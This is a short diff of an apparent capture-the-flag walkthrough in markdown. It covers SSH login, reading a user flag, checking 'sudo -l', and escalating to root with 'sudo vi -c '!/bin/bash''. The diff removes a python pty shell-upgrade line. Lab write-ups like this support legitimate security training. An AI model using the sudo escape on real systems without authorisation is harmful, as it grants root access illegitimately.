@@ -66,14 +66,9 @@ ssh -i teleport charlie@ip
 ```
 ## Port 22
 
+* cd /home/charlie
 ```
 cat uesr.txt
-```
-## root 
-
-* start tty
-```
-python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 * see the permissions you have
 ```
@@ -85,6 +80,9 @@ sudo -l
 sudo vi -c '!/bin/bash'
 ```
 * now you are root
+## root 
+
+
 * go to /root
 ```
 python root.py
